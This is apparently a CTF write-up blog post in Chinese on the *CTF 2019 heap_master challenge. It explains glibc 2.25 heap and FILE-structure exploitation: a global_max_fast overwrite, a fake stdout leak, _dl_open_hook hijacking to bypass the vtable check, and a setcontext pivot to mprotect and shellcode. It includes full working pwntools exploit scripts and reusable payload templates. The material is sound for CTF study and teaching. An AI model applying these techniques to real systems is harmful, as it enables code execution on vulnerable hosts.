---
title: Starctf2019_Heap_master
date: 2019-05-10 10:51:54
tags:
layout: default
---
非常精彩的一题,对题目了解越深入发现自己越菜.
<!--more-->
# Heap_master
很自由的一题但是了解下去发现题目的各个思路还是很巧妙的.
先讲几个在这题中学到新姿势
# setcontext()
其作用是用户上下文的获取和设置
所以我们在可以小范围控制执行流已知`libc_base`但不足以完成我们的目标时可以先跳`setcontext+53`来扩大控制范围..
感觉非常好用..可以直接控制大部分寄存器和执行流.
```python
   0x7ffff7a7d4a0 <setcontext>:	push   rdi
   0x7ffff7a7d4a1 <setcontext+1>:	lea    rsi,[rdi+0x128]
   0x7ffff7a7d4a8 <setcontext+8>:	xor    edx,edx
   0x7ffff7a7d4aa <setcontext+10>:	mov    edi,0x2
   0x7ffff7a7d4af <setcontext+15>:	mov    r10d,0x8
   0x7ffff7a7d4b5 <setcontext+21>:	mov    eax,0xe
   0x7ffff7a7d4ba <setcontext+26>:	syscall 
   0x7ffff7a7d4bc <setcontext+28>:	pop    rdi
   0x7ffff7a7d4bd <setcontext+29>:	cmp    rax,0xfffffffffffff001
   0x7ffff7a7d4c3 <setcontext+35>:	jae    0x7ffff7a7d520 <setcontext+128>
   0x7ffff7a7d4c5 <setcontext+37>:	mov    rcx,QWORD PTR [rdi+0xe0]
   0x7ffff7a7d4cc <setcontext+44>:	fldenv [rcx]
   0x7ffff7a7d4ce <setcontext+46>:	ldmxcsr DWORD PTR [rdi+0x1c0]
   0x7ffff7a7d4d5 <setcontext+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
   0x7ffff7a7d4dc <setcontext+60>:	mov    rbx,QWORD PTR [rdi+0x80]
   0x7ffff7a7d4e3 <setcontext+67>:	mov    rbp,QWORD PTR [rdi+0x78]
   0x7ffff7a7d4e7 <setcontext+71>:	mov    r12,QWORD PTR [rdi+0x48]
   0x7ffff7a7d4eb <setcontext+75>:	mov    r13,QWORD PTR [rdi+0x50]
   0x7ffff7a7d4ef <setcontext+79>:	mov    r14,QWORD PTR [rdi+0x58]
   0x7ffff7a7d4f3 <setcontext+83>:	mov    r15,QWORD PTR [rdi+0x60]
   0x7ffff7a7d4f7 <setcontext+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
   0x7ffff7a7d4fe <setcontext+94>:	push   rcx
   0x7ffff7a7d4ff <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
   0x7ffff7a7d503 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
   0x7ffff7a7d50a <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
   0x7ffff7a7d511 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
   0x7ffff7a7d515 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
   0x7ffff7a7d519 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
   0x7ffff7a7d51d <setcontext+125>:	xor    eax,eax
   0x7ffff7a7d51f <setcontext+127>:	ret    
   0x7ffff7a7d520 <setcontext+128>:	mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78
   0x7ffff7a7d527 <setcontext+135>:	neg    eax
   0x7ffff7a7d529 <setcontext+137>:	mov    DWORD PTR fs:[rcx],eax
   0x7ffff7a7d52c <setcontext+140>:	or     rax,0xffffffffffffffff
   0x7ffff7a7d530 <setcontext+144>:	ret
```
常见做法是用来`call mprotec`->`jmp shellcode`

# global_fast_max
虽然之前常听说攻击这个的方法但是没有实践过.

* `unsortedbin atk`+`partial write` to modify  `global_max_fast`(1/16)

之后`free`一些预先设定好`size`的`chunk`就可以覆盖掉一些关键数据:`main_arean`,`_IO_list_all`,`stdout`,`_dl_open_hook`...

本题就用了 控制`global_max_fast`+`stout`操作来实现`leak`
其中比较不尽人意的是`fake_stdou`需要自己把一些关键值填好,所以需要在已有`chunk`中有比较随意的写(指定`offset`的`read`).

# Mofidy _IO_FILE.flags to leak
这个点在之前[babytcache][1]中有详细讲过.有时候泄露的内容比较少可以夸张一点`partial write `两个字`\x00\x00`节可能会泄露一些你想要的地址.比如这题中`mmap`的地址.

😅我的exp泄露出来了了`mmap`的地址...我少写了8字节..结果就泄露出来了.后来就不想改了
# vtable_check
可能是发现`IO_file`太好用了...`glibc-2.24`开始对`vtable`进行检测.
对使用`vtable`前先来个简单的check:`IO_validate_vtable`
```c
//https://code.woboq.org/userspace/glibc/libio/libioP.h.html#IO_validate_vtable
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```
比较好理解.就是`check`一下当前的`vatable`地址是否在`__start___libc_IO_vtables`和`__stop___libc_IO_vtables`之间没有就用`_IO_vtable_check()`判断
gdb下看了一下发现那之间存放有很多的`vtable`但是没有剩余的空间.
而且是只读区域.感觉这里难以下手
不过先知上好像有一种[利用方法][2]...日后再啃
* _IO_vtable_check()
```c
//https://code.woboq.org/userspace/glibc/libio/vtables.c.html#_IO_vtable_check
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag == &_IO_vtable_check)
    return;
  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (!rtld_active ()
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }
#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif
  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
```
上面的源码应该是新版libc的不过2.25也差不多
```python
 Dl_info di;
   56     struct link_map *l;
 ► 57     if (_dl_open_hook != NULL
   58         || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
   59             && l->l_ns != LM_ID_BASE))
   60       return;
```
在`__libc_fatal`前有三个ret但是一般我们的`binary`都是`!SHARED`所以常见的绕过方式可以是改写`__dlopen`,可以通过改写`global_fast_max`后盖掉`_dl_open_hook`或者通过`unsorted bin atk`改写`_dl_open_hook`

# _dl_open_hook 
`_dl_open_hook`
在最近的libc内`_dl_open_hook`结构如下
```c
static struct dl_open_hook _dl_open_hook =
  {
    .dlopen_mode = __libc_dlopen_mode,
    .dlsym = __libc_dlsym,
    .dlclose = __libc_dlclose,
    .dlvsym = __libc_dlvsym,
  };
```
有两个域会在`malloc_printerr`中被trigger:
```c
//https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_printerr
malloc_printerr (const char *str)
{
  __libc_message (do_abort, "%s\n", str);
  __builtin_unreachable ();
}
```
跟踪函数调用链发现:
`__libc_message`--->`backtrace_and_maps`--->`__GI___backtrace`--->`init`
```c
https://code.woboq.org/userspace/glibc/debug/backtrace.c.html#50
static void
init (void)
{
  libgcc_handle = __libc_dlopen (LIBGCC_S_SO);
  if (libgcc_handle == NULL)
    return;
  unwind_backtrace = __libc_dlsym (libgcc_handle, "_Unwind_Backtrace");
  unwind_getip = __libc_dlsym (libgcc_handle, "_Unwind_GetIP");
  if (unwind_getip == NULL)
    unwind_backtrace = NULL;
  unwind_getcfa = (__libc_dlsym (libgcc_handle, "_Unwind_GetCFA")
                  ?: dummy_getcfa);
}
```

在`init`函数中调用了`__libc_dlopen`,`__libc_dlsym`其中调用了`_dl_open_hook`的第一,二个域所以我们可以在`hijacking`的同时设置`_dl_open_hook`的第一二个域.

可以和上面讲到的`setcontext`连起来使用.

在`__libc_dlsym`会`call _dl_open_hook.dlsym`此时`rdi=_dl_open_hook`所以我们可以通过`setcontext`来完成对执行流的控制.

还有一点技巧的是想做`house of orange`时也会触发以上函数所以最好填上`ret`的gadget

# deubg with symbols

有个老哥搞了个完整的debug组件
`https://github.com/ray-cp/pwn_debug/blob/master/build.sh`
...我就偷了他的`build.sh`来提升我的做题体验...感觉有了符号体验好多了
主要原理是下载对应版本的libc源码之后编译,`debug`的时候`LD_PRELOAD`进来
不过注意不同版本的`libc`需要复制一份`LD`到`/lib64/Ld****`
之后再patch掉`binary`

# chroot
`wiki`
```
chroot是在unix系统的一个操作，针对正在运作的软件行程和它的子进程，改变它外显的根目录。一个运行在这个环境下，经由chroot设置根目录的程序，它不能够对这个指定根目录之外的文件进行访问动作，不能读取，也不能更改它的内容。chroot这一特殊表达可能指chroot(2)系统调用或chroot(8)前端程序。
由chroot创造出的那个根目录，叫做“chroot监狱”（chroot jail，或chroot prison）
```
用的不多...做了半天才发这题是用了`chroot`
```sh
$ cat pwn
#!/bin/bash
cd `dirname $0`
exec 2>/dev/null
echo ICMgICAjICAgICMjIyMgICAgIyMjIyMgICMjIyMjIwogICMgIyAgICAjICAgICMgICAgICMgICAgIwojIyMgIyMjICAjICAgICAgICAgICMgICAgIyMjIyMKICAjICMgICAgIyAgICAgICAgICAjICAgICMKICMgICAjICAgIyAgICAjICAgICAjICAgICMKICAgICAgICAgICMjIyMgICAgICAjICAgICMK | base64 -d
timeout 60 chroot --userspec=pwn:pwn ./ ./heap_master
```
然后在这里 了解了一下chroot===>`https://linux.cn/article-3068-1.html`

才发现其实这题是在`ubuntu16.04`的`docker`但是实际的`root_dir`是`/home/pwn/`所以`libc&ld`用的是2.25的

* 在`glibc-2.24`以上对`vtable`的调用就有了检查


(我在ubuntu 16.04 下调试发现 如果直接用`one_gadget`或者`house of orange`或者`system('/bin/sh')`都会因为 `LD_PRELOAD="xxxx"`环境变量crash掉,最后结合了`balsn`和官方的做法`open-read-write`,因为远端环境关掉了在docker上还未有时间去测试,所以不清楚会crash是因为`chroot`还是因为我的调试环境有时间做个测试).


# Others' Wp
[official][3]
---
[balsn][4]
# Analysis
[binary][5]
`timeout 60 chroot --userspec=pwn:pwn ./ ./heap_master`
所以虽然是ubuntu16:04但是使用`/share/lib`中的libc-2.25.so...
之前没怎么见过这种方式...
导致调试的时候
如果`env={'LD_PRELOAD':'/glibc/x64/2.25/lib/libc-2.25.so'}`时
`fork`进程会因为环境变量`env`而crash...
才知道不能直接`fork`开`shell`
checksec:全保护
```python
[*] '/home/n132/Desktop/heap_master/heap_master'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
题目很有意思主要有三个功能`edit`,`add`,`free`
* `add`中可以`malloc`任意`size`但是不反回获得的`chunk`
* `eidit`可以对题目中`mmap`的区域中的任意地址做任意长度的写.
* `free`可以对题目中`mmap`的区域中的任意地址做`free`操作
可以说是在`mmap`内非常自由了
但是题目的难点是我们无法自由地做在`mmap`区域外的写只能靠`ptmalloc`的机制往外面填一些东西.

心路历程:
* 无法自由地做在`mmap`区域外的写===> 我们可能难以任意控制hook
* 所以应该是利用`IO_file`的`vtable` 攻击完成攻击
* 选择了改写`_dl_open_hook`的方法去`passby check`
* 于是想到了控制`global_max_fast`
* 控制`stdout`......
# 思路
* unsorted bin atk to set `global_max_fast`
* free(0xm) to cover `_dl_open_hook`  
* free(0xn) to cover stdout after finising setting the fake chunk
* IO_leak to get `libc_base`
* reset `_dl_open_hook`(ret,setcontext,....)
* call printerr to trigger our exploit :setcontext->call mprotect->shellcode

# FAKE_EXP
先放上一个因为前面所说的env问题失败的exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter("size: ",str(size))
def edit(off,c):
	cmd(2)
	p.sendlineafter("set: ",str(off))
	p.sendlineafter("size: ",str(len(c)))
	p.sendafter("content: ",c)
def free(off):
	cmd(3)
	p.sendlineafter("set: ",str(off))
context.log_level='debug'
#p=process('./heap_master',env={'LD_PRELOAD':"/glibc/x64/2.25/lib/libc-2.25.so"})
p=process("./heap_master",env={'LD_PRELOAD':"./libc.so.6"})
#libc=ELF("/glibc/x64/2.25/lib/libc-2.25.so")
libc=ELF("./libc.so.6")

##FAKE STDOUT 's off:0x620
for x in range(14):
	edit(0x610+x*0x10,p64(0)+p64(0x301))
edit(0x900,p64(0x21)*0x30)
for x in range(14):
	free(0x620+0x10*(13-x))
	add(0x2f8)
# so lets fill the fake chunk like... ooh , our fake_Stdout start's off:0x1000
'''
0x7ffff7dd5600 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007ffff7dd5683
0x7ffff7dd5610 <_IO_2_1_stdout_+16>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5620 <_IO_2_1_stdout_+32>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5630 <_IO_2_1_stdout_+48>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5640 <_IO_2_1_stdout_+64>:	0x00007ffff7dd5684	0x0000000000000000
0x7ffff7dd5650 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd5660 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007ffff7dd48c0
0x7ffff7dd5670 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7ffff7dd5680 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007ffff7dd6760
0x7ffff7dd5690 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd56a0 <_IO_2_1_stdout_+160>:	0x00007ffff7dd4780	0x0000000000000000
0x7ffff7dd56b0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd56c0 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd56d0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007ffff7dd1440

'''


'''

edit(0x670,p64(0)+p64(0x81))
edit(0x670+0x80,p64(0x21)*5)
edit(0x770,p64(0)+p64(0x81))
edit(0x770+0x80,p64(0x21)*5)
free(0x680)
free(0x780)
#'''

edit(0x620,p64(0xfbad1800)+"\x00".ljust(0x10,'\x00')+'\x00\x50')
#edit(0x640,'\x83\x56')
for x in range(4):
	edit(0x648+x*8,'\x83\x56')
edit(0x660,'\x84')
edit(0x668,'\x00'*0x20)
edit(0x688,'\xc0\x48')
edit(0x690,p64(1)+p64(0xffffffffffffffff)+p64(0x000000000a000000)+'\x60\x67')
edit(0x6b0,p64(0xffffffffffffffff)+p64(0)+'\x80\x47')
edit(0x6c8,p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2+'\x40\x14')
#D0ne.... so let's get the control of global fast max
edit(0,p64(0)+p64(0x91)+'\x00'*0x88+p64(0x21)*5)
free(0x10)
edit(0x10,p64(0)+'\xc0\x67')
add(0x88)

# get it!
edit(0x620,p64(0xfbad1800)+p64(0x17e1))
edit(0x620+0x17d8,p64(0x21)*0x20)

free(0x630)
p.read(0x10)
magic=u64(p.read(8))
p.read(0x10)
base=u64(p.read(8))-(0x7ffff7dd4b68-0x7ffff7a37000)
log.warning(hex(magic))
log.warning(hex(base))

libc.address=base
# Modify the _dl_open_hook
n=0x18+2283-10+4
edit(0x1000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x1010)
one=0x3fe36+base
'''

'''
edit(0x1000,p64(0x000555555554FC0)+p64(0x7ffff7b15e89)+p64(0))
# _dl_open_hook get  

# _IO_list_all 0x7ffff7dd5500
n=0x18
edit(0x2000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x2010)


n=320+1
edit(0x2000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x2010)

system=libc.sym['system']
#
fio=magic+0x2000
fake = "/bin/sh\x00"+p64(0x61)+p64(0)+p64(0)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
edit(0x2000,fake)

'''
0x3fe36	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3fe8a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6175	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
#gdb.attach(p,'b *0x7ffff7ab0a30')
gdb.attach(p,'b _IO_vtable_check')
cmd("A")

p.interactive()

```

# EXP
概率(1/16):实际好像更高...可能`stdou`内容有些东西可能不需要那么精准..
```python
from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter("size: ",str(size))
def edit(off,c):
	cmd(2)
	p.sendlineafter("set: ",str(off))
	p.sendlineafter("size: ",str(len(c)))
	p.sendafter("content: ",c)
def free(off):
	cmd(3)
	p.sendlineafter("set: ",str(off))
#context.log_level='debug'
context.arch='amd64'
p=process('./heap_master',env={'LD_PRELOAD':"/glibc/x64/2.25/lib/libc-2.25.so"})
#p=process("./heap_master",env={'LD_PRELOAD':"./libc.so.6"})
libc=ELF("/glibc/x64/2.25/lib/libc-2.25.so")
#libc=ELF("./libc.so.6")

##FAKE STDOUT 's off:0x620
for x in range(14):
	edit(0x610+x*0x10,p64(0)+p64(0x301))
edit(0x900,p64(0x21)*0x30)
for x in range(14):
	free(0x620+0x10*(13-x))
	add(0x2f8)
# so lets fill the fake chunk like... ooh , our fake_Stdout start's off:0x1000
'''
0x7ffff7dd5600 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007ffff7dd5683
0x7ffff7dd5610 <_IO_2_1_stdout_+16>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5620 <_IO_2_1_stdout_+32>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5630 <_IO_2_1_stdout_+48>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5640 <_IO_2_1_stdout_+64>:	0x00007ffff7dd5684	0x0000000000000000
0x7ffff7dd5650 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd5660 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007ffff7dd48c0
0x7ffff7dd5670 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7ffff7dd5680 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007ffff7dd6760
0x7ffff7dd5690 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd56a0 <_IO_2_1_stdout_+160>:	0x00007ffff7dd4780	0x0000000000000000
0x7ffff7dd56b0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd56c0 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd56d0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007ffff7dd1440

'''



edit(0x620,p64(0xfbad1800)+"\x00".ljust(0x10,'\x00')+'\x00\x50')
#edit(0x640,'\x83\x56')
for x in range(4):
	edit(0x648+x*8,'\x83\x56')
edit(0x660,'\x84')
edit(0x668,'\x00'*0x20)
edit(0x688,'\xc0\x48')
edit(0x690,p64(1)+p64(0xffffffffffffffff)+p64(0x000000000a000000)+'\x60\x67')
edit(0x6b0,p64(0xffffffffffffffff)+p64(0)+'\x80\x47')
edit(0x6c8,p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2+'\x40\x14')
#D0ne.... so let's get the control of global fast max
edit(0,p64(0)+p64(0x91)+'\x00'*0x88+p64(0x21)*5)
free(0x10)
edit(0x10,p64(0)+'\xc0\x67')
add(0x88)

# get it!
edit(0x620,p64(0xfbad1800)+p64(0x17e1))
edit(0x620+0x17d8,p64(0x21)*0x20)

free(0x630)
p.read(0x10)
magic=u64(p.read(8))
p.read(0x10)
base=u64(p.read(8))-(0x7ffff7dd4b68-0x7ffff7a37000)-(0x7ffff7a37000-0x7ffff7a3b000)
log.warning(hex(magic))
log.warning(hex(base))

libc.address=base
# Modify the _dl_open_hook
n=0x18+2283-10
edit(0x1000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x1010)

# _dl_open_hook get  

# _IO_list_all 0x7ffff7dd5500
payload=p64(0x7ffff7b15e89-0x7ffff7a3b000+base)+p64(0x7ffff7a7d4d5-0x7ffff7a3b000+base)+p64(0)
payload=payload.ljust(0x68)+p64(magic)+p64(0x10000)
payload=payload.ljust(0x88)+p64(0x7)
payload=payload.ljust(0xa0,'\x00')+p64(magic+0x2964)+p64(libc.sym['mprotect'])
edit(0x1000,payload)
shellcode='''
xor rax,rax
xor rdi,rdi
xor rdx,rdx
xor rsi,rsi
mov al,2
mov rdi,0x0067616c662f2e
sub rsp,0x100
push rdi
mov rdi,rsp
syscall
mov al,0
mov rdi,4
mov rsi,{}
mov rdx,0x100
syscall
mov al,1
mov rdi,1
mov rsi,{}
mov rdx,0x23
syscall
'''
shellcode=shellcode.format(hex(magic+0x2699),hex(magic+0x2699))
n132=asm(shellcode)
edit(0x2964,p64(magic+0x296c)+n132)
'''
   0x7ffff7a7d4d5 <setcontext+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
   0x7ffff7a7d4dc <setcontext+60>:	mov    rbx,QWORD PTR [rdi+0x80]
   0x7ffff7a7d4e3 <setcontext+67>:	mov    rbp,QWORD PTR [rdi+0x78]
n132>>> 
   0x7ffff7a7d4e7 <setcontext+71>:	mov    r12,QWORD PTR [rdi+0x48]
   0x7ffff7a7d4eb <setcontext+75>:	mov    r13,QWORD PTR [rdi+0x50]
   0x7ffff7a7d4ef <setcontext+79>:	mov    r14,QWORD PTR [rdi+0x58]
   0x7ffff7a7d4f3 <setcontext+83>:	mov    r15,QWORD PTR [rdi+0x60]
   0x7ffff7a7d4f7 <setcontext+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
   0x7ffff7a7d4fe <setcontext+94>:	push   rcx
   0x7ffff7a7d4ff <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
   0x7ffff7a7d503 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
n132>>> 
   0x7ffff7a7d50a <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
   0x7ffff7a7d511 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
   0x7ffff7a7d515 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
   0x7ffff7a7d519 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
   0x7ffff7a7d51d <setcontext+125>:	xor    eax,eax
   0x7ffff7a7d51f <setcontext+127>:	ret 
'''
'''

gdb.attach(p,"""
b _IO_vtable_check
""")
'''
free(299)
p.interactive()
'''
_dl_open_hook:0x7ffff7dd62e0
stdout:0x7ffff7dd2708
global_fast_max:0x7ffff7dd67d0
'''
```

# setcontext+0x35
## payload for case: `__free_hook` -> `setcontext+0x35`
```python
rsp=heap+0x800
rdi=heap
rsi=0x1000
rdx=7
call=libc.sym['mprotect']
payload=p64(0)+p64(libc.sym['setcontext']+0x35)
payload=payload.ljust(0x68,'\0')+p64(rdi)+p64(rsi)
payload=payload.ljust(0x88)+p64(rdx)
payload=payload.ljust(0xa0,'\x00')+p64(rsp)+p64(call)
```
## payload for case: `orange call setcontext+0x35`
```python
rsp=heap+0x800
rdi=heap
rsi=0x1000
rdx=7
call=libc.sym['mprotect']
payload=
payload=payload.ljust(0x68)+p64(rdi)+p64(rsi)
payload=payload.ljust(0x88)+p64(rdx)
payload=payload.ljust(0xa0,'\x00')+p64(rsp)+p64(call)
```
## FBI WARNING
It's useful on ubuntu 16 - ubuntu 18
but not in ubuntu 19.04, there is part of souce code of setcontext@glibc-19.04:
```
//setcontext
push rdi 
....
pop rdx
...
mov    rsp,QWORD PTR [rdx+0xa0]
```
so we lose setcontext+0x35 on 19.04 or other libcs are later published.

[1]:https://n132.github.io/2018/11/15/2018-11-15-Hitcone-baby-tcache/
[2]:https://xz.aliyun.com/t/2411
[3]:https://github.com/sixstars/starctf2019/tree/master/pwn-heap_master
[4]:https://balsn.tw/ctf_writeup/20190427-*ctf/#heap-master
[5]:https://github.com/n132/Watermalon/tree/master/Starctf_2019/heap_master